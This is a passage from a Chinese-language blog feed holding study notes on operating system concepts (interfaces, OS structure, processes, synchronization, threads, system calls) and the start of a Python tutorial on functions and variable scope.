title="命令接口"></a>命令接口</h5><ul><li>联机用户接口：它由一组键盘操作命令及命令解释程序所组成。当用户在终端或控制台上每键入一条命令后，系统便立即转入命令解释程序，对该命令加以解释并执行该命令。在完成指定功能后，控制又返回终端或控制台上，等待用户键入下一条命令。</li><li>脱机用户接口：该接口由一组作业控制语言JCL组成。批处理作业的用户不能直接与自己的作业交互作用，只能委托系统代替用户对作业进行控制和干预。用户用JCL把需要对作业进行的控制和干预，实现写在作业说明书上，然后将作业连同说明书一起提供给系统。当系统调度到该作业运行时，又调用命令解释程序，对作业说明书上的命令，逐条地解释执行。作业一直在作业说明书的控制下运行，直至遇到作业结束语句时，系统才停止该作业的运行</li></ul><h5 id="程序接口"><a href="#程序接口" class="headerlink" title="程序接口"></a>程序接口</h5><p>该接口是为用户程序在执行中访问系统资源而设置的，是用户程序取得操作系统服务的惟一途径。它是由一组系统调用组成，每一个系统调用都是一个能完成特定功能的子程序，每当应用程序要求OS提供某种服务时，便调用具有相应共的系统调用。</p><h5 id="图形接口"><a href="#图形接口" class="headerlink" title="图形接口"></a>图形接口</h5><p>图形用户接口采用了图形化的操作界面。用户可用鼠标或通过菜单和对话框，来完成对应用程序和文件的操作</p><h3 id="操作系统的结构设计"><a href="#操作系统的结构设计" class="headerlink" title="操作系统的结构设计"></a>操作系统的结构设计</h3><h4 id="软件工程的基本概念"><a href="#软件工程的基本概念" class="headerlink" title="软件工程的基本概念"></a>软件工程的基本概念</h4><h5 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h5><p>软件是指在计算机运行时，能提供所要求的功能和性能的指令和程序的集合，该程序能够正确地处理信息的数据结构</p><h5 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h5><p>软件工程是指运用系统的、规范的和可定量的方法，来开发、运行和维护软件。</p><h4 id="传统的操作系统结构"><a href="#传统的操作系统结构" class="headerlink" title="传统的操作系统结构"></a>传统的操作系统结构</h4><p>我们把第一代至第三代的OS结构，称为传统的OS结构，而把微内核的OS结构称为现代OS结构。</p><h5 id="无结构操作系统"><a href="#无结构操作系统" class="headerlink" title="无结构操作系统"></a>无结构操作系统</h5><p>此时的OS是为数众多的一组过程的集合，各过程之间可以互相调用，在操作系统内部也不存在任何结构，因此，这种OS是无结构的，也被称为整体系统结构。</p><h5 id="模块化OS结构"><a href="#模块化OS结构" class="headerlink" title="模块化OS结构"></a>模块化OS结构</h5><p>模块化结构：该技术是基于分解和模块化原则来控制大型软件的复杂度的。下图表示出了由模块、子模块等组成的模块化OS结构：<br><img src="https://pic2.superbed.cn/item/5df4ef89a4fbc8614a5c5492.jpg" alt=""></p><h5 id="分层式OS结构"><a href="#分层式OS结构" class="headerlink" title="分层式OS结构"></a>分层式OS结构</h5><ul><li>有序分层的基本概念：每一层都仅使用其底层所提供的功能和服务，这样可使系统的调试和验证都变得容易。</li><li>层次的设置：①程序嵌套②运行频率③公用模块④用户接口</li></ul><h4 id="微内核OS结构"><a href="#微内核OS结构" class="headerlink" title="微内核OS结构"></a>微内核OS结构</h4><h5 id="客户-服务器模式"><a href="#客户-服务器模式" class="headerlink" title="客户-服务器模式"></a>客户-服务器模式</h5><ol><li>基本概念：将OS分为两部分：</li></ol><ul><li>用于提供各种服务的一组服务器(进程)，所有这些服务器都运行在用户态</li><li>内核：用来处理客户和服务器之间的通信，即由内核来接收客户的请求，再将该请求送至相应的服务器；同时接收服务器的应答，并将此应答回送给请求客户。</li></ul><p>下图是单机环境下的客户/服务器模式：<br><img src="https://pic3.superbed.cn/item/5df4f1c3a4fbc8614a5cd075.jpg" alt=""></p><h5 id="微内核技术"><a href="#微内核技术" class="headerlink" title="微内核技术"></a>微内核技术</h5><ol><li>微内核技术的引入：微内核技术，是指精心设计的、能实现现代OS核心功能的小型内核。微内核不是一个完整的OS，而只是为构建通用OS提供的一个重要基础。</li><li>微内核的基本功能：进程管理、存储器管理、进程间通信、I/O设备管理</li></ol><h3 id="操作系统的体系架构"><a href="#操作系统的体系架构" class="headerlink" title="操作系统的体系架构"></a>操作系统的体系架构</h3><ul><li>内核态：cpu可以访问内存的所有数据</li><li>用户态：只能受限的访问内存，且不允许访问外围设备</li><li>目的：限制不同的程序之间的访问能力</li><li>切换方式：系统调用</li></ul><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程的基本概念"><a href="#进程的基本概念" class="headerlink" title="进程的基本概念"></a>进程的基本概念</h3><h4 id="进程的定义"><a href="#进程的定义" class="headerlink" title="进程的定义"></a>进程的定义</h4><ol><li>进程是程序的一次执行</li><li>进程是一个程序及其数据在处理机上顺序执行时所发生的活动</li><li>进程是程序在一个数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位<br>我们可以把传统OS中的进程定义为：进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位</li></ol><h4 id="进程的特征"><a href="#进程的特征" class="headerlink" title="进程的特征"></a>进程的特征</h4><ol><li>结构特征</li><li>动态性</li><li>并发性</li><li>独立性</li><li>异步性</li></ol><h4 id="进程的三种基本状态"><a href="#进程的三种基本状态" class="headerlink" title="进程的三种基本状态"></a>进程的三种基本状态</h4><ol><li>就绪状态</li><li>执行状态</li><li>阻塞状态<br>下图是三种基本状态及其转换：<br><img src="https://pic2.superbed.cn/item/5df4f7c0a4fbc8614a5e2b19.jpg" alt=""></li></ol><h4 id="挂起状态"><a href="#挂起状态" class="headerlink" title="挂起状态"></a>挂起状态</h4><h5 id="引起挂起状态的原因"><a href="#引起挂起状态的原因" class="headerlink" title="引起挂起状态的原因"></a>引起挂起状态的原因</h5><ul><li>终端用户的请求</li><li>父进程的请求</li><li>负荷调节的需要</li><li>操作系统的需要</li></ul><h5 id="具有挂起状态的进程状态图"><a href="#具有挂起状态的进程状态图" class="headerlink" title="具有挂起状态的进程状态图"></a>具有挂起状态的进程状态图</h5><p><img src="https://pic.superbed.cn/item/5df4fae1a4fbc8614a5f195a.jpg" alt=""></p><h4 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h4><h5 id="进程控制块的作用"><a href="#进程控制块的作用" class="headerlink" title="进程控制块的作用"></a>进程控制块的作用</h5><p>进程控制块(Process Control Block,PCB)的作用是在使一个在多道程序环境下不能独立运行的程序，称为一个能独立运行的基本单位，一个能与其他进程并发执行的进程。或者说OS是通过PCB对并发执行的进程进行控制和管理的。</p><h5 id="进程控制块中的信息"><a href="#进程控制块中的信息" class="headerlink" title="进程控制块中的信息"></a>进程控制块中的信息</h5><ol><li>进程标识符：用于唯一标识一个进程。一个进程通常有两种标识符：</li></ol><ul><li>内部标识符：由操作系统创建，通常是一个进程的序号，方便系统使用</li><li>外部标识符：由创建者提供，在用户(或进程)访问该进程时使用。</li></ul><ol start="2"><li>处理机状态<br>处理机状态信息主要是由处理机的各种寄存器中的内容组成的：</li></ol><ul><li>通用寄存器：用户程序可以访问，用于暂存信息。</li><li>指令计数器：存放了要访问的一下条指令的地址</li><li>程序状态字PSW：含有状态信息</li><li>用户栈指针：指每个用户进程都有一个或若干个与之相关的系统栈，用于存放过程和系统调用参数及调用地址。栈的指针指向该栈的栈顶。</li></ul><ol start="3"><li>进程调度信息<br>在PCB中还存放着与进程调度和进程对换有关的信息：</li></ol><ul><li>进程状态：指明进程的当前状态，作为进程调度和对换时的依据</li><li>进程优先级：用于描述进程使用处理机的优先级别的一个整数，优先级高的进程应有限获得处理机。</li><li>进程调度所需的其他信息，它们与所采用的进程调度算法有关</li><li>事件：指进程由执行状态变为阻塞状态所等待的发生的事件，即阻塞原因</li></ul><ol start="4"><li>进程控制信息<br>包括：</li></ol><ul><li>程序和数据的地址：是指进程的数据和程序所在的内存或外存地址，以便于再调度到该进程执行时，能从PCB中找到其程序和数据</li><li>进程同步和通信机制：指实现进程同步和进程通信时必须的机制，如消息队列指针、信号量等，它们可能全部或部分地放在PCB中</li><li>资源清单：是一张列出了除CPU以外的、进程所需的全部资源以及已经分配到该进程的资源的清单</li><li>链接指针：给出了本进程所在队列中下一个进程的PCB的首地址</li></ul><h5 id="进程控制块的组织方式"><a href="#进程控制块的组织方式" class="headerlink" title="进程控制块的组织方式"></a>进程控制块的组织方式</h5><ol><li>链接方式<br><img src="https://pic3.superbed.cn/item/5df4fd5ea4fbc8614a5fac00.jpg" alt=""></li><li>索引方式<br><img src="https://pic3.superbed.cn/item/5df505e7a4fbc8614a6160eb.jpg" alt=""></li></ol><h3 id="进程控制-1"><a href="#进程控制-1" class="headerlink" title="进程控制"></a>进程控制</h3><h4 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h4><h5 id="引起创建进程的事件"><a href="#引起创建进程的事件" class="headerlink" title="引起创建进程的事件"></a>引起创建进程的事件</h5><ol><li>用户登录</li><li>作业调度</li><li>提供服务</li><li>应用请求</li></ol><h5 id="进程的创建-1"><a href="#进程的创建-1" class="headerlink" title="进程的创建"></a>进程的创建</h5><ol><li>申请空白PCB</li><li>为新进程分配资源</li><li>初始化进程控制块</li><li>将新进程插入就绪队列，如果进程就绪队列能够接纳新进程，便将新进程插入就绪队列。</li></ol><h4 id="进程的终止"><a href="#进程的终止" class="headerlink" title="进程的终止"></a>进程的终止</h4><h5 id="引起进程终止的事件"><a href="#引起进程终止的事件" class="headerlink" title="引起进程终止的事件"></a>引起进程终止的事件</h5><ol><li>正常结束：在任何计算机系统中，都应有一个用于标识进程已经运行完成的指示。(批处理系统的Holt指令，分时系统的Logs off)</li><li>异常结束：在进程运行期间，由于出现某些错误或故障而迫使进程终止，常见的错误有：</li></ol><ul><li>越界错误：指程序所访问的存储区，已越出该进程的区域</li><li>保护错：进程试图去访问一个不允许访问的资源或文件，或者以不适当的方式进行访问(进程试图去写一个只读文件)</li><li>非法指令：程序试图去执行一条不存在的指令(原因可能是程序错误地转移到数据区，把数据当成了指令)</li><li>特权指令错：用户进程试图去执行一条只允许OS执行的指令</li><li>运行超时：进程的执行时间超过了指定的最大值</li><li>等待超时：进程等待某事件的时间，超过了规定的最大值</li><li>算术运算错：进程试图去执行一个被禁止的运算(如被0除)</li><li>I/O故障：I/O过程中发生了错误</li></ul><ol start="3"><li>外界干预：指进程应外界的请求而终止运行。这些干预有：</li></ol><ul><li>操作员或操作系统干预</li><li>父进程请求：父进程具有终止自己的任何子孙进程的权利</li><li>父进程终止：当父进程终止时，OS也将他的所有子孙进程终止</li></ul><h5 id="进程的终止过程"><a href="#进程的终止过程" class="headerlink" title="进程的终止过程"></a>进程的终止过程</h5><ol><li>根据被终止进程的标识符，从PCB集合中检索出该进程的PCB，从中读出该进程的状态</li><li>若被终止进程正处于执行状态，应立即终止该进程的执行，并置调度标志为真，用于指示进程被终止后应重新进行调度</li><li>若该进程还有子孙进程，还应将其所有子孙进程予以终止，以防他们成为不可控的进程</li><li>将被终止进程所拥有的全部资源，或者归还给其父进程，或者归还给系统</li><li>将被终止进程(它的PCB)从所在队列(或链表)中移出，等待其他程序来搜集信息</li></ol><h4 id="进程的阻塞与唤醒"><a href="#进程的阻塞与唤醒" class="headerlink" title="进程的阻塞与唤醒"></a>进程的阻塞与唤醒</h4><h5 id="引起进程阻塞和唤醒的事件"><a href="#引起进程阻塞和唤醒的事件" class="headerlink" title="引起进程阻塞和唤醒的事件"></a>引起进程阻塞和唤醒的事件</h5><ul><li>请求系统服务</li><li>启动某种操作</li><li>新数据尚未到达</li><li>无新工作可做</li></ul><h5 id="进程阻塞过程"><a href="#进程阻塞过程" class="headerlink" title="进程阻塞过程"></a>进程阻塞过程</h5><p>正在执行的进程，当发现上述事件时，由于无法继续执行，于是进程便通过调用阻塞原语block把自己阻塞。可见，进程的阻塞是进程自身的一种主动行为，进入block过程后，应立即停止进程的执行，把进程控制块中的现行状态由执行改为阻塞，并将PCB插入阻塞队列。</p><h5 id="进程唤醒过程"><a href="#进程唤醒过程" class="headerlink" title="进程唤醒过程"></a>进程唤醒过程</h5><p>当被阻塞进程所期待的事件出现时，如I/O完成或所期待的数据到达，则由有关进程(比如用完并释放该I/O设备的进程)调用唤醒原语wakeup()，将等待该事件的进程唤醒。唤醒原语的执行过程是：首先把被阻塞的进程从阻塞队列移出，将其PCB中的现行状态由阻塞改为就绪，然后再将该PCB插入到就绪队列中</p><h4 id="进程的挂起与激活"><a href="#进程的挂起与激活" class="headerlink" title="进程的挂起与激活"></a>进程的挂起与激活</h4><h5 id="进程的挂起"><a href="#进程的挂起" class="headerlink" title="进程的挂起"></a>进程的挂起</h5><p>当出现了引起进程挂起的事件时，系统将利用挂起原语suspend()将指定进程挂起。</p><h5 id="进程的激活"><a href="#进程的激活" class="headerlink" title="进程的激活"></a>进程的激活</h5><p>当发生激活进程的事件时，系统将利用激活原语active将指定进程激活。</p><h3 id="进程同步-1"><a href="#进程同步-1" class="headerlink" title="进程同步"></a>进程同步</h3><h4 id="进程同步的基本概念"><a href="#进程同步的基本概念" class="headerlink" title="进程同步的基本概念"></a>进程同步的基本概念</h4><ul><li>进程(线程)同步：进程之间的关系不是相互排斥临界资源的关系，而是相互依赖的关系。进一步的说明：就是前一个进程的输出作为后一个进程的输入，当第一个进程没有输出时第二个进程必须等待。具有同步关系的一组并发进程相互发送的信息称为消息或事件。(按顺序执行)</li><li>异步：彼此独立,在等待某事件的过程中继续做自己的事，不需要等待这一事件完成后再工作</li></ul><h4 id="进程同步的方式和机制："><a href="#进程同步的方式和机制：" class="headerlink" title="进程同步的方式和机制："></a>进程同步的方式和机制：</h4><ul><li>临界区、互斥对象</li><li>信号量、事件对象</li></ul><h5 id="两种形式的制约关系"><a href="#两种形式的制约关系" class="headerlink" title="两种形式的制约关系"></a>两种形式的制约关系</h5><ul><li>间接相互制约关系</li><li>直接相互制约关系</li></ul><h5 id="同步机制应遵循的规则"><a href="#同步机制应遵循的规则" class="headerlink" title="同步机制应遵循的规则"></a>同步机制应遵循的规则</h5><ul><li>空闲让进</li><li>忙则等待</li><li>有限等待</li><li>让权等待</li></ul><h4 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h4><ol><li>整型信号量：除初始化外，仅能通过两个标准的原子操作(P/V)来访问信号量</li><li>记录型信号量</li><li>AND型信号量：将进程在整个运行过程中需要的所有资源，一次性全部地分配给进程，待进程使用完后再一起释放。只要尚有一个资源未能分配给进程，其它所有可能为之分配的资源，也不分配给他</li></ol><h3 id="进程通信-1"><a href="#进程通信-1" class="headerlink" title="进程通信"></a>进程通信</h3><h4 id="进程通信的类型"><a href="#进程通信的类型" class="headerlink" title="进程通信的类型"></a>进程通信的类型</h4><h5 id="共享存储器系统"><a href="#共享存储器系统" class="headerlink" title="共享存储器系统"></a>共享存储器系统</h5><ul><li>基于共享数据结构的通信方式</li><li>基于共享存储区的通信方式</li></ul><h5 id="消息传递系统"><a href="#消息传递系统" class="headerlink" title="消息传递系统"></a>消息传递系统</h5><p>在消息传递系统中，进程间的数据交换，是以格式化的消息(message)为单位的。</p><h5 id="管道-pipe-通信"><a href="#管道-pipe-通信" class="headerlink" title="管道(pipe)通信"></a>管道(pipe)通信</h5><p>管道,是指用于连接一个读进程和一个写进程以实现他们之间通信的一个共享文件，又名Pipe文件。向管道(共享文件)提供输入的发送进程(写进程)，以字符流形式将大量数据送入管道；而接受管道输出的接收进程(读进程)，则从管道中接收数据。</p><h4 id="消息传递通信的实现方法"><a href="#消息传递通信的实现方法" class="headerlink" title="消息传递通信的实现方法"></a>消息传递通信的实现方法</h4><ol><li>直接通信方式：指发送进程利用OS所提供的发送命令，直接把消息发送给目标进程。此时，要求发送进程和接收进程都以显式方式提供对方的标识符。</li><li>间接通信方式：</li></ol><ul><li>信箱的创建和撤销：进程可利用信箱创建原语来建立一个新信箱。创建者进程应给出信箱名字、信箱属性。对于共享信箱，还应给出共享者的名字。当进程不再需要读信箱时，可用信箱撤销原语将之撤销。</li><li>消息的发送和接收：当进程之间要利用信箱进行通信时，必须使用共享信箱。</li></ul><p>信箱可由操作系统创建，也可由用户进程创建，创建者是信箱的拥有者。据此，可把信箱分为以下三类：</p><ul><li>私用信箱：由用户创建，并作为该进程的一部分</li><li>公用信箱：由操作系统创建，并提供给系统中的所有核准进程使用</li><li>共享信箱：由进程创建，创建后，指明它是可共享的，同时必须指出共享进程(用户)的名字。</li></ul><p>在利用信箱通信时，在发送进程和接收进程之间，存在以下四种关系：</p><ul><li>一对一关系</li><li>多对一关系：也称为客户/服务器交互</li><li>一对多关系：发送进程可进行广播方式，向多个接收者发送消息</li><li>多对多关系：允许建立一个公用信箱，让多个进程都能向信箱中投递消息</li></ul><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><h4 id="线程与进程"><a href="#线程与进程" class="headerlink" title="线程与进程"></a>线程与进程</h4><ul><li>进程：进程是程序的一次执行过程，是一个动态概念，是程序在执行过程中分配和管理资源的基本单位，每一个进程都有一个自己的地址空间</li><li>线程：线程是CPU调度和分派的基本单位，它可与同属一个进程的其他的线程共享进程所拥有的全部资源。</li><li>进程与线程的联系：线程是进程的一部分，一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程</li></ul><h5 id="线程与进程的区别"><a href="#线程与进程的区别" class="headerlink" title="线程与进程的区别"></a>线程与进程的区别</h5><ul><li>根本区别：进程是操作系统资源分配的基本单位，而线程是CPU调度和执行的基本单位</li><li>开销方面：每个进程都有独立的代码和数据空间（程序上下文），程序之间的切换会有较大的开销；线程可以看做轻量级的进程，同一类线程共享代码和数据空间，每个线程都有自己独立的运行栈和程序计数器（PC），线程之间切换的开销小。</li><li>运行环境：在操作系统中能同时运行多个进程（程序）；而在同一个进程（程序）中有多个线程同时执行（通过CPU调度，在每个时间片中只有一个线程执行）</li><li>内存分配：系统在运行的时候会为每个进程分配不同的内存空间(独立地址空间)；而对线程而言，除了CPU外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源(共享地址空间)。</li></ul><h4 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h4><p>为使程序能并发执行，系统还必须进行以下的一系列操作：</p><ol><li>创建进程</li><li>撤销进程</li><li>进程切换</li></ol><h5 id="线程的属性"><a href="#线程的属性" class="headerlink" title="线程的属性"></a>线程的属性</h5><ol><li>轻型实体</li><li>独立调度和分派的基本单位</li><li>可并发执行</li><li>共享进程资源</li></ol><h5 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h5><ol><li>状态参数：在OS中的每一个线程都可以利用线程标识符和一组状态参数进行描述。状态参数通常有以下几项：</li></ol><ul><li>寄存器状态：包括程序计数器PC和堆栈指针中的内容</li><li>堆栈：在堆栈中通常保存有局部变量和返回地址</li><li>线程运行状态：用于描述线程正处于何种运行状态</li><li>优先级：描述线程执行的有限程度</li><li>线程专用存储器：用于保存线程自己的局部变量拷贝</li><li>信号屏蔽：对某些信号加以屏蔽</li></ul><ol start="2"><li>线程运行状态：执行状态、就绪状态、阻塞状态</li></ol><h5 id="线程的创建和终止"><a href="#线程的创建和终止" class="headerlink" title="线程的创建和终止"></a>线程的创建和终止</h5><p>在线程OS环境下，应用程序在启动时，通常仅有一个线程在执行，该线程被人们称为初始化线程。它可以根据需要再去创建若干个线程。在创建新线程时，需要利用一个线程创建函数(或系统调用)，并提供相应的参数，如指向线程主程序的入口指针、堆栈的大小，以及用于调度的优先级等。在线程创建函数执行完后，将返回一个线程标识符供以后使用。</p><p>终止线程的方式有两种：</p><ul><li>在线程完成了自己的工作后自愿退出</li><li>线程在运行中出现错误或由于某种原因被其它线程强行终止</li></ul><h5 id="多线程OS中的进程"><a href="#多线程OS中的进程" class="headerlink" title="多线程OS中的进程"></a>多线程OS中的进程</h5><p>在多线程OS中，进程是作为拥有系统资源的基本单位，通过的进程都包含多个线程并为它们提供资源，但此时的进程就不再作为一个执行的实体。多线程OS中的进程有以下属性：</p><ul><li>作为系统资源分配的单位</li><li>可包括多个线程</li><li>进程不是一个可执行的实体</li></ul><h4 id="线程间的同步和通信"><a href="#线程间的同步和通信" class="headerlink" title="线程间的同步和通信"></a>线程间的同步和通信</h4><h5 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h5><p>互斥锁用于实现进程间对资源互斥访问的机制。互斥锁有开锁和关锁两种状态</p><h5 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h5><p>每一个条件变量通常与一个互斥锁一起使用。亦即，在创建一个互斥锁时便联系着一个条件变量。单纯的互斥锁用于短期锁定，主要是用来保证对临界区的互斥进入。而条件变量则用于线程的长期等待，直至所等待的资源称为可用的。</p><h5 id="信号量机制-1"><a href="#信号量机制-1" class="headerlink" title="信号量机制"></a>信号量机制</h5><ol><li>私用信号量：当某线程需利用信号量来实现同一进程中各线程之间的同步时，可调用创建信号量的命令来创建一私用信号量。私用信号量属于特定的进程所有，OS并不知道私用信号量的存在。因此，一旦发生私用信号量的占有者异常结束或正常结束，但并未释放该信号量所占有空间的情况时，系统将无法使它恢复为0，也不能将它传给下一个请求它的线程。</li><li>公用信号量：公用信号量是为实现不同进程间或不同进程中的各线程之间的同步而设置的。</li></ol><h4 id="内核级线程和用户级线程"><a href="#内核级线程和用户级线程" class="headerlink" title="内核级线程和用户级线程"></a>内核级线程和用户级线程</h4><h5 id="内核级线程"><a href="#内核级线程" class="headerlink" title="内核级线程"></a>内核级线程</h5><p>无论是用户进程中的线程，还是系统进程中的线程，他们的创建、撤销和切换等，也是依靠内核实现的。此外，在内核空间还为每一个内核支持线程设置了一个线程控制块，内核是根据该控制块而感知某线程的存在的，并对其加以控制</p><h5 id="用户级线程"><a href="#用户级线程" class="headerlink" title="用户级线程"></a>用户级线程</h5><p>用户级线程仅存在于用户空间中。对于这种线程的创建、撤销、线程之间的同步与通信等功能，都无需利用系统调用来实现。对于用户级线程的切换，通常是发生在一个应用进程的诸多线程之间，这时，同样无需内核的支持</p><h5 id="用户级和内核级进程的区别"><a href="#用户级和内核级进程的区别" class="headerlink" title="用户级和内核级进程的区别"></a>用户级和内核级进程的区别</h5><ul><li>用户态的进程能存取它们自己的指令和数据，但不能存取内核指令和数据（或其他进程的指令和数据）。</li><li>核心态下的进程能够存取内核和用户地址 </li></ul><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>由操作系统实现提供的所有系统调用所构成的集合即程序接口或应用编程接口(Application Programming Interface，API)。是应用程序同系统之间的接口。(摘自百度百科)</p><h5 id="系统调用和中断"><a href="#系统调用和中断" class="headerlink" title="系统调用和中断"></a>系统调用和中断</h5><p>系统调用和中断的关系就在于，当进程发出系统调用申请的时候，会产生一个软件中断。产生这个软件中断以后，系统会去对这个软中断进行处理，这个时候进程就处于核心态了</p><h4 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h4><h5 id="用户级线程的实现"><a href="#用户级线程的实现" class="headerlink" title="用户级线程的实现"></a>用户级线程的实现</h5><ol><li>运行时系统：实质上是用于管理和控制线程的函数(过程)的集合。正因为有这些函数，才能使用户级线程与内核无关。运行时系统中的所有函数都驻留在用户空间，并作为用户级线程与内核之间的接口</li><li>内核控制线程：又称轻型进程LWP(Light Weight Process)，每个进程都可拥有多个LWP，同用户级线程一样，每个LWP都有自己的数据结构。LWP可通过系统调用来获得内核提供的服务，这样，当一个用户级线程运行时，只要将它连接到一个LWP上，此时它便拥有了内核支持线程的所有属性。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(3)</title>
      <link href="/2019/10/02/python2/"/>
      <url>/2019/10/02/python2/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的分类"><a href="#函数的分类" class="headerlink" title="函数的分类"></a>函数的分类</h2><ul><li>函数分为两种类型： 一种设计成返回值，一种仅执行代码而不返回</li><li>函数用来将复杂的问题分解为更小的问题，进而消除重复性代码，通过分解为不同的逻辑单元使其更容易阅读</li></ul><h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p>python中自带的函数，返回值由python规定</p><h3 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" title="用户自定义函数"></a>用户自定义函数</h3><p>自定义返回值的函数</p><pre class=" language-bash"><code class="language-bash">def 函数名<span class="token punctuation">(</span>参数1，参数2，<span class="token punctuation">..</span>.<span class="token punctuation">)</span>:    语句块    <span class="token keyword">return</span> 返回值</code></pre><blockquote><p>注：一旦return语句得到执行，函数立即终止。return语句可以出现在函数体中的任何位置。<br>    python有一个称为None的对象用来表示空值，此对象没有任何方法。</p></blockquote><h4 id="传递参数的形式"><a href="#传递参数的形式" class="headerlink" title="传递参数的形式"></a>传递参数的形式</h4><h5 id="按照位置传递参数：调用语句中的实际参数与函数头中的形式参数一一对应，实参的数目必须与形参相同，实参的数据类型必须与形参相同"><a href="#按照位置传递参数：调用语句中的实际参数与函数头中的形式参数一一对应，实参的数目必须与形参相同，实参的数据类型必须与形参相同" class="headerlink" title="按照位置传递参数：调用语句中的实际参数与函数头中的形式参数一一对应，实参的数目必须与形参相同，实参的数据类型必须与形参相同"></a>按照位置传递参数：调用语句中的实际参数与函数头中的形式参数一一对应，实参的数目必须与形参相同，实参的数据类型必须与形参相同</h5><h5 id="按照默认值传递参数"><a href="#按照默认值传递参数" class="headerlink" title="按照默认值传递参数"></a>按照默认值传递参数</h5><p>一个函数的某些(或者全部)参数可以有默认值——当没有值传递给它们时而赋给的值。</p><pre class=" language-bash"><code class="language-bash">def total<span class="token punctuation">(</span>w,x,y<span class="token operator">=</span>10,z<span class="token operator">=</span>20<span class="token punctuation">)</span>:    return<span class="token punctuation">((</span>w**x<span class="token punctuation">)</span>+y+z<span class="token punctuation">)</span>total<span class="token punctuation">(</span>2,3<span class="token punctuation">)</span>  //2^3+10+20 38total<span class="token punctuation">(</span>2,3,4<span class="token punctuation">)</span>  //2^3+4+20 32total<span class="token punctuation">(</span>2,3,4,5<span class="token punctuation">)</span>  //2^3+4+5  //17</code></pre><blockquote><p>注：在函数定义中，没有默认值的参数必须放在有默认值的参数前面，如def func(x,y=2,z)<br>是不合法的</p></blockquote><h5 id="按照关键字传递参数"><a href="#按照关键字传递参数" class="headerlink" title="按照关键字传递参数"></a>按照关键字传递参数</h5><p>实际参数可以通过使用相应形式参数的名字传递给函数，而不是根据位置</p><pre class=" language-bash"><code class="language-bash">def total<span class="token punctuation">(</span>w,x,y<span class="token operator">=</span>10,z<span class="token operator">=</span>20<span class="token punctuation">)</span>:    return<span class="token punctuation">((</span>w**x<span class="token punctuation">)</span>+y+z<span class="token punctuation">)</span>total<span class="token punctuation">(</span>y<span class="token operator">=</span>4,x<span class="token operator">=</span>3,w<span class="token operator">=</span>2<span class="token punctuation">)</span>  //2^3+4+20 32total<span class="token punctuation">(</span>2,y<span class="token operator">=</span>4,x<span class="token operator">=</span>3<span class="token punctuation">)</span> //2^3+4+20 32total<span class="token punctuation">(</span>2,3,y<span class="token operator">=</span>4<span class="token punctuation">)</span> //2^3+4+20 32total<span class="token punctuation">(</span>w<span class="token operator">=</span>2,3,y<span class="token operator">=</span>4<span class="token punctuation">)</span> //error ,不合法,按位置传递的实参必须要放在按关键字传递的实参前<span class="token punctuation">(</span>形参类似<span class="token punctuation">)</span></code></pre><blockquote><p>注：当实际参数是一个表达式时，先要计算表达式，然后将它的值传给形式参数</p></blockquote><h4 id="向函数传值"><a href="#向函数传值" class="headerlink" title="向函数传值"></a>向函数传值</h4><p>如果函数调用的实际参数是一个变量，那么由实际参数变量指向的对象(而不是实际参数变量本身)传递给了形式参数变量。因此，如果对象是不可变的且函数改变了形式参数变量的值，实际参数所指向的对象不会发生任何改变，当实际参数变量指向数值、字符串或元组对象时，不管怎样通过函数调用改变实际参数的值，都是不可能的。</p><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main()函数"></a>main()函数</h3><p>主函数(main函数)既没有参数，也没有返回值，是程序的入口函数</p><pre class=" language-bash"><code class="language-bash">def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:    函数体main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>注：python中需要调用主函数，之后初始化要执行的任务(一般将第一个函数命名为main，它的前面有import语句和全局变量，所有的程序将以main()语句结尾，从而调用main()函数)</p></blockquote><h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><ul><li>在函数内部创建的变量只能被同一函数内部的语句访问，并且当函数退出后变量就不存在了。(每次函数被调用时变量再重新创建)，这样的变量对于函数来说是局部的，有局部作用域。对于函数的参数同样成立。</li><li>如果在两个不同的函数创建了同样名称的变量，那么它们之间没有任何关系，可以当作完全不同的变量，对于函数的参数同样成立。<pre class=" language-bash"><code class="language-bash">def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:  x<span class="token operator">=</span>2  print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span>+<span class="token string">": function main"</span><span class="token punctuation">)</span>  trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>  print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span>+<span class="token string">": function main"</span><span class="token punctuation">)</span>def trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>:  x<span class="token operator">=</span>3  print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span>+<span class="token string">": function trivial"</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果</span>2 <span class="token keyword">:</span> <span class="token 